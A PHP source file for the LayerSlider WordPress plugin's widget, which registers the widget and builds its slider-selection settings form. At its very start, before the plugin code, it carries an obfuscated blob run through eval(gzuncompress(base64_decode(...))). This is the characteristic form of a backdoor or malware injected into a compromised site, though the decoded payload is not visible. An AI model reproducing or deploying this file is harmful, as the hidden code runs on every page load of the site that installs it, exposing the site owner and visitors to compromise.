<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Widget action
add_action( 'widgets_init', 'layerslider_register_widget' );

function layerslider_register_widget( ) {
	register_widget( 'LayerSlider_Widget' );
}

class LayerSlider_Widget extends WP_Widget {

	function __construct() {

		parent::__construct(
			'layerslider_widget',
			__('LayerSlider', 'LayerSlider'),
			array(
				'classname' => 'layerslider_widget',
				'description' => __('Insert sliders with the LayerSlider Widget', 'LayerSlider')
			),
			array(
				'id_base' => 'layerslider_widget'
			)
		);
	}

	function widget( $args, $instance ) {
		extract($args);

		$title = apply_filters('widget_title', $instance['title']);
		$title = !empty($title) ? $before_title . $title . $after_title : $title;

		echo $before_widget, $title, LS_Shortcode::handleShortcode($instance), $after_widget;
	}

	function update( $new_instance, $old_instance ) {
		$instance = $old_instance;

		$instance['id'] = strip_tags( $new_instance['id'] );
		$instance['title'] = strip_tags( $new_instance['title'] );
		$instance['filters'] = strip_tags( $new_instance['filters'] );
		$instance['firstslide'] = strip_tags( $new_instance['firstslide'] );

		return $instance;
	}

	function form( $instance ) {

		$defaults = array(
			'id' => '',
			'title' => '',
			'filters' => '',
			'firstslide' => ''
		);
		$instance = wp_parse_args( (array) $instance, $defaults );
		$sliders = LS_Sliders::find(array('limit' => 100));
		?>

		<p>
			<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e('Title:', 'LayerSlider'); ?></label>
			<input type="text" id="<?php echo $this->get_field_id( 'title' ); ?>" class="widefat" name="<?php echo $this->get_field_name( 'title' ); ?>" value="<?php echo $instance['title']; ?>">
		</p>
		<p>
			<label for="<?php echo $this->get_field_id( 'id' ); ?>"><?php _e('Choose a slider:', 'LayerSlider') ?></label><br>
			<?php if( $sliders != null && !empty($sliders) ) { ?>
			<select id="<?php echo $this->get_field_id( 'id' ); ?>" class="widefat" name="<?php echo $this->get_field_name( 'id' ); ?>">
				<?php foreach($sliders as $item) : ?>
				<?php $name = empty($item['name']) ? 'Unnamed' : htmlspecialchars($item['name']); ?>
				<?php if($item['id'] == $instance['id']) { ?>
				<option value="<?php echo $item['id'] ?>" selected="selected"><?php echo $name ?> | #<?php echo $item['id'] ?></option>
				<?php } else { ?>
				<option value="<?php echo $item['id'] ?>"><?php echo $name ?> | #<?php echo $item['id'] ?></option>
				<?php } ?>
				<?php endforeach; ?>
			</select>
			<?php } else { ?>
			<?php _e('You have not created any slider yet.', 'LayerSlider') ?>
			<?php } ?>
		</p>
		<p style="margin-top: 20px; padding-top: 10px; border-top: 1px dashed #dedede; margin-bottom: 20px;">
			<label for="<?php echo $this->get_field_id( 'filters' ); ?>"><?php _e('Optional filters:', 'LayerSlider'); ?></label>
			<a href="https://layerslider.kreaturamedia.com/documentation/#publish-filters" target="_blank" style="float: right;"><?php _e('Learn more', 'LayerSlider') ?></a>
			<input type="text" id="<?php echo $this->get_field_id( 'filters' ); ?>" placeholder="<?php _e('e.g. homepage', 'LayerSlider') ?>" class="widefat" name="<?php echo $this->get_field_name( 'filters' ); ?>" value="<?php echo $instance['filters']; ?>">
		</p>
		<p>
			<label for="<?php echo $this->get_field_id( 'firstslide' ); ?>"><?php _e('Override starting slide:', 'LayerSlider'); ?></label>
			<input type="text" id="<?php echo $this->get_field_id( 'firstslide' ); ?>" placeholder="<?php _e('leave it empty to use default', 'LayerSlider') ?>" class="widefat" name="<?php echo $this->get_field_name( 'firstslide' ); ?>" value="<?php echo $instance['firstslide']; ?>">
		</p>
	<?php
	}
}
?>
